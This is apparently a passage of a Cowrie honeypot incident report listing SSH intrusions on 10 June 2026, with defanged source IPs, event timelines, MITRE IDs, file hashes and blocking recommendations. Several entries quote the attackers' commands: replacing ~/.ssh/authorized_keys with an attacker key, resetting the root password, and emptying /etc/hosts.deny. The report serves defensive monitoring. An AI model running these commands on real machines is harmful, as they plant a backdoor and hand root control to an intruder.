| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:33:42` | `cowrie.session.connect` |
| `2026-06-10 04:33:42` | `cowrie.client.version` |
| `2026-06-10 04:33:42` | `cowrie.client.kex` |
| `2026-06-10 04:33:49` | `cowrie.login.success` |
| `2026-06-10 04:33:50` | `cowrie.session.params` |
| `2026-06-10 04:33:50` | `cowrie.command.input` |
| `2026-06-10 04:33:50` | `cowrie.command.failed` |
| `2026-06-10 04:33:51` | `cowrie.log.closed` |
| `2026-06-10 04:33:52` | `cowrie.session.params` |
| `2026-06-10 04:33:52` | `cowrie.command.input` |
| `2026-06-10 04:33:53` | `cowrie.session.file_download` |
| `2026-06-10 04:33:53` | `cowrie.log.closed` |
| `2026-06-10 04:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-363674275fe4

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:33 |
| **Last Seen** | 2026-06-10 04:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:33:58` | `cowrie.session.connect` |
| `2026-06-10 04:33:58` | `cowrie.client.version` |
| `2026-06-10 04:33:59` | `cowrie.client.kex` |
| `2026-06-10 04:34:03` | `cowrie.login.success` |
| `2026-06-10 04:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4efc8e4cacde

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:37 |
| **Last Seen** | 2026-06-10 04:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:37:43` | `cowrie.session.connect` |
| `2026-06-10 04:37:43` | `cowrie.client.version` |
| `2026-06-10 04:37:43` | `cowrie.client.kex` |
| `2026-06-10 04:37:46` | `cowrie.login.success` |
| `2026-06-10 04:37:47` | `cowrie.session.params` |
| `2026-06-10 04:37:47` | `cowrie.command.input` |
| `2026-06-10 04:37:47` | `cowrie.command.failed` |
| `2026-06-10 04:37:47` | `cowrie.log.closed` |
| `2026-06-10 04:37:48` | `cowrie.session.params` |
| `2026-06-10 04:37:48` | `cowrie.command.input` |
| `2026-06-10 04:37:48` | `cowrie.session.file_download` |
| `2026-06-10 04:37:48` | `cowrie.log.closed` |
| `2026-06-10 04:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b542063b77

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:37 |
| **Last Seen** | 2026-06-10 04:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:37:51` | `cowrie.session.connect` |
| `2026-06-10 04:37:51` | `cowrie.client.version` |
| `2026-06-10 04:37:51` | `cowrie.client.kex` |
| `2026-06-10 04:37:53` | `cowrie.login.success` |
| `2026-06-10 04:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df05421b7ebf

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:42 |
| **Last Seen** | 2026-06-10 04:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:42:20` | `cowrie.session.connect` |
| `2026-06-10 04:42:20` | `cowrie.client.version` |
| `2026-06-10 04:42:20` | `cowrie.client.kex` |
| `2026-06-10 04:42:21` | `cowrie.login.success` |
| `2026-06-10 04:42:22` | `cowrie.session.params` |
| `2026-06-10 04:42:22` | `cowrie.command.input` |
| `2026-06-10 04:42:22` | `cowrie.command.failed` |
| `2026-06-10 04:42:22` | `cowrie.log.closed` |
| `2026-06-10 04:42:23` | `cowrie.session.params` |
| `2026-06-10 04:42:23` | `cowrie.command.input` |
| `2026-06-10 04:42:23` | `cowrie.session.file_download` |
| `2026-06-10 04:42:23` | `cowrie.log.closed` |
| `2026-06-10 04:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3249c4c84b08

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:42 |
| **Last Seen** | 2026-06-10 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:42:26` | `cowrie.session.connect` |
| `2026-06-10 04:42:26` | `cowrie.client.version` |
| `2026-06-10 04:42:26` | `cowrie.client.kex` |
| `2026-06-10 04:42:27` | `cowrie.login.success` |
| `2026-06-10 04:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05bd4f4f00a

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:46 |
| **Last Seen** | 2026-06-10 04:46 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:46:10` | `cowrie.session.connect` |
| `2026-06-10 04:46:12` | `cowrie.client.version` |
| `2026-06-10 04:46:12` | `cowrie.client.kex` |
| `2026-06-10 04:46:16` | `cowrie.login.success` |
| `2026-06-10 04:46:17` | `cowrie.session.params` |
| `2026-06-10 04:46:17` | `cowrie.command.input` |
| `2026-06-10 04:46:17` | `cowrie.command.failed` |
| `2026-06-10 04:46:18` | `cowrie.log.closed` |
| `2026-06-10 04:46:18` | `cowrie.session.params` |
| `2026-06-10 04:46:18` | `cowrie.command.input` |
| `2026-06-10 04:46:18` | `cowrie.session.file_download` |
| `2026-06-10 04:46:18` | `cowrie.log.closed` |
| `2026-06-10 04:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30a4be3a20e6

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]189` |
| **First Seen** | 2026-06-10 04:46 |
| **Last Seen** | 2026-06-10 04:46 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZMI5RTN5PQTL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:46:11` | `cowrie.session.connect` |
| `2026-06-10 04:46:11` | `cowrie.client.version` |
| `2026-06-10 04:46:11` | `cowrie.client.kex` |
| `2026-06-10 04:46:12` | `cowrie.login.success` |
| `2026-06-10 04:46:12` | `cowrie.session.params` |
| `2026-06-10 04:46:12` | `cowrie.command.input` |
| `2026-06-10 04:46:12` | `cowrie.command.failed` |
| `2026-06-10 04:46:12` | `cowrie.log.closed` |
| `2026-06-10 04:46:12` | `cowrie.session.params` |
| `2026-06-10 04:46:12` | `cowrie.command.input` |
| `2026-06-10 04:46:13` | `cowrie.session.file_download` |
| `2026-06-10 04:46:13` | `cowrie.log.closed` |
| `2026-06-10 04:46:25` | `cowrie.session.params` |
| `2026-06-10 04:46:25` | `cowrie.command.input` |
| `2026-06-10 04:46:25` | `cowrie.log.closed` |
| `2026-06-10 04:46:26` | `cowrie.session.params` |
| `2026-06-10 04:46:26` | `cowrie.command.input` |
| `2026-06-10 04:46:26` | `cowrie.log.closed` |
| `2026-06-10 04:46:26` | `cowrie.session.params` |
| `2026-06-10 04:46:26` | `cowrie.command.input` |
| `2026-06-10 04:46:26` | `cowrie.session.file_download` |
| `2026-06-10 04:46:26` | `cowrie.log.closed` |
| `2026-06-10 04:46:27` | `cowrie.session.params` |
| `2026-06-10 04:46:27` | `cowrie.command.input` |
| `2026-06-10 04:46:27` | `cowrie.log.closed` |
| `2026-06-10 04:46:28` | `cowrie.session.params` |
| `2026-06-10 04:46:28` | `cowrie.command.input` |
| `2026-06-10 04:46:28` | `cowrie.log.closed` |
| `2026-06-10 04:46:29` | `cowrie.session.params` |
| `2026-06-10 04:46:29` | `cowrie.command.input` |
| `2026-06-10 04:46:29` | `cowrie.command.input` |
| `2026-06-10 04:46:29` | `cowrie.log.closed` |
| `2026-06-10 04:46:29` | `cowrie.session.params` |
| `2026-06-10 04:46:29` | `cowrie.command.input` |
| `2026-06-10 04:46:29` | `cowrie.log.closed` |
| `2026-06-10 04:46:29` | `cowrie.session.params` |
| `2026-06-10 04:46:29` | `cowrie.command.input` |
| `2026-06-10 04:46:30` | `cowrie.log.closed` |
| `2026-06-10 04:46:30` | `cowrie.session.params` |
| `2026-06-10 04:46:30` | `cowrie.command.input` |
| `2026-06-10 04:46:30` | `cowrie.log.closed` |
| `2026-06-10 04:46:30` | `cowrie.session.params` |
| `2026-06-10 04:46:30` | `cowrie.command.input` |
| `2026-06-10 04:46:31` | `cowrie.log.closed` |
| `2026-06-10 04:46:31` | `cowrie.session.params` |
| `2026-06-10 04:46:31` | `cowrie.command.input` |
| `2026-06-10 04:46:31` | `cowrie.log.closed` |
| `2026-06-10 04:46:31` | `cowrie.session.params` |
| `2026-06-10 04:46:31` | `cowrie.command.input` |
| `2026-06-10 04:46:31` | `cowrie.log.closed` |
| `2026-06-10 04:46:32` | `cowrie.session.params` |
| `2026-06-10 04:46:32` | `cowrie.command.input` |
| `2026-06-10 04:46:32` | `cowrie.log.closed` |
| `2026-06-10 04:46:32` | `cowrie.session.params` |
| `2026-06-10 04:46:32` | `cowrie.command.input` |
| `2026-06-10 04:46:32` | `cowrie.log.closed` |
| `2026-06-10 04:46:33` | `cowrie.session.params` |
| `2026-06-10 04:46:33` | `cowrie.command.input` |
| `2026-06-10 04:46:33` | `cowrie.log.closed` |
| `2026-06-10 04:46:33` | `cowrie.session.params` |
| `2026-06-10 04:46:33` | `cowrie.command.input` |
| `2026-06-10 04:46:33` | `cowrie.log.closed` |
| `2026-06-10 04:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39935d6de754

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:46 |
| **Last Seen** | 2026-06-10 04:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:46:22` | `cowrie.session.connect` |
| `2026-06-10 04:46:22` | `cowrie.client.version` |
| `2026-06-10 04:46:23` | `cowrie.client.kex` |
| `2026-06-10 04:46:23` | `cowrie.login.success` |
| `2026-06-10 04:46:23` | `cowrie.session.params` |
| `2026-06-10 04:46:23` | `cowrie.command.input` |
| `2026-06-10 04:46:23` | `cowrie.command.failed` |
| `2026-06-10 04:46:24` | `cowrie.log.closed` |
| `2026-06-10 04:46:24` | `cowrie.session.params` |
| `2026-06-10 04:46:24` | `cowrie.command.input` |
| `2026-06-10 04:46:24` | `cowrie.session.file_download` |
| `2026-06-10 04:46:24` | `cowrie.log.closed` |
| `2026-06-10 04:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab95ec6b2f8

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:46 |
| **Last Seen** | 2026-06-10 04:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:46:23` | `cowrie.session.connect` |
| `2026-06-10 04:46:26` | `cowrie.client.version` |
| `2026-06-10 04:46:26` | `cowrie.client.kex` |
| `2026-06-10 04:46:30` | `cowrie.login.success` |
| `2026-06-10 04:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f45c699ef6d

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:46 |
| **Last Seen** | 2026-06-10 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:46:26` | `cowrie.session.connect` |
| `2026-06-10 04:46:26` | `cowrie.client.version` |
| `2026-06-10 04:46:26` | `cowrie.client.kex` |
| `2026-06-10 04:46:27` | `cowrie.login.success` |
| `2026-06-10 04:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec2d8923add

| Field | Detail |
|---|---|
| **Source IP** | `106.13.100[.]52` |
| **First Seen** | 2026-06-10 04:47 |
| **Last Seen** | 2026-06-10 04:48 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HJpPZVDX3T8d"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:47:31` | `cowrie.session.connect` |
| `2026-06-10 04:47:31` | `cowrie.client.version` |
| `2026-06-10 04:47:32` | `cowrie.client.kex` |
| `2026-06-10 04:47:34` | `cowrie.login.success` |
| `2026-06-10 04:47:36` | `cowrie.session.params` |
| `2026-06-10 04:47:36` | `cowrie.command.input` |
| `2026-06-10 04:47:36` | `cowrie.command.failed` |
| `2026-06-10 04:47:39` | `cowrie.log.closed` |
| `2026-06-10 04:47:42` | `cowrie.session.params` |
| `2026-06-10 04:47:42` | `cowrie.command.input` |
| `2026-06-10 04:47:43` | `cowrie.session.file_download` |
| `2026-06-10 04:47:43` | `cowrie.log.closed` |
| `2026-06-10 04:48:01` | `cowrie.session.params` |
| `2026-06-10 04:48:01` | `cowrie.command.input` |
| `2026-06-10 04:48:01` | `cowrie.log.closed` |
| `2026-06-10 04:48:02` | `cowrie.session.params` |
| `2026-06-10 04:48:02` | `cowrie.command.input` |
| `2026-06-10 04:48:03` | `cowrie.log.closed` |
| `2026-06-10 04:48:04` | `cowrie.session.params` |
| `2026-06-10 04:48:04` | `cowrie.command.input` |
| `2026-06-10 04:48:04` | `cowrie.session.file_download` |
| `2026-06-10 04:48:04` | `cowrie.log.closed` |
| `2026-06-10 04:48:05` | `cowrie.session.params` |
| `2026-06-10 04:48:05` | `cowrie.command.input` |
| `2026-06-10 04:48:05` | `cowrie.log.closed` |
| `2026-06-10 04:48:06` | `cowrie.session.params` |
| `2026-06-10 04:48:06` | `cowrie.command.input` |
| `2026-06-10 04:48:06` | `cowrie.log.closed` |
| `2026-06-10 04:48:06` | `cowrie.session.params` |
| `2026-06-10 04:48:06` | `cowrie.command.input` |
| `2026-06-10 04:48:06` | `cowrie.command.input` |
| `2026-06-10 04:48:07` | `cowrie.log.closed` |
| `2026-06-10 04:48:07` | `cowrie.session.params` |
| `2026-06-10 04:48:07` | `cowrie.command.input` |
| `2026-06-10 04:48:08` | `cowrie.log.closed` |
| `2026-06-10 04:48:08` | `cowrie.session.params` |
| `2026-06-10 04:48:08` | `cowrie.command.input` |
| `2026-06-10 04:48:08` | `cowrie.log.closed` |
| `2026-06-10 04:48:09` | `cowrie.session.params` |
| `2026-06-10 04:48:09` | `cowrie.command.input` |
| `2026-06-10 04:48:09` | `cowrie.log.closed` |
| `2026-06-10 04:48:10` | `cowrie.session.params` |
| `2026-06-10 04:48:10` | `cowrie.command.input` |
| `2026-06-10 04:48:10` | `cowrie.log.closed` |
| `2026-06-10 04:48:11` | `cowrie.session.params` |
| `2026-06-10 04:48:11` | `cowrie.command.input` |
| `2026-06-10 04:48:11` | `cowrie.log.closed` |
| `2026-06-10 04:48:12` | `cowrie.session.params` |
| `2026-06-10 04:48:12` | `cowrie.command.input` |
| `2026-06-10 04:48:12` | `cowrie.log.closed` |
| `2026-06-10 04:48:13` | `cowrie.session.params` |
| `2026-06-10 04:48:13` | `cowrie.command.input` |
| `2026-06-10 04:48:13` | `cowrie.log.closed` |
| `2026-06-10 04:48:13` | `cowrie.session.params` |
| `2026-06-10 04:48:13` | `cowrie.command.input` |
| `2026-06-10 04:48:14` | `cowrie.log.closed` |
| `2026-06-10 04:48:15` | `cowrie.session.params` |
| `2026-06-10 04:48:15` | `cowrie.command.input` |
| `2026-06-10 04:48:15` | `cowrie.log.closed` |
| `2026-06-10 04:48:15` | `cowrie.session.params` |
| `2026-06-10 04:48:15` | `cowrie.command.input` |
| `2026-06-10 04:48:16` | `cowrie.log.closed` |
| `2026-06-10 04:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.100[.]52` to AbuseIPDB if not already reported
- [ ] Block `106.13.100[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0514c201112a

| Field | Detail |
|---|---|
| **Source IP** | `64.89.162[.]149` |
| **First Seen** | 2026-06-10 04:48 |
| **Last Seen** | 2026-06-10 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:48:06` | `cowrie.session.connect` |
| `2026-06-10 04:48:07` | `cowrie.login.success` |
| `2026-06-10 04:48:07` | `cowrie.session.params` |
| `2026-06-10 04:48:07` | `cowrie.log.closed` |
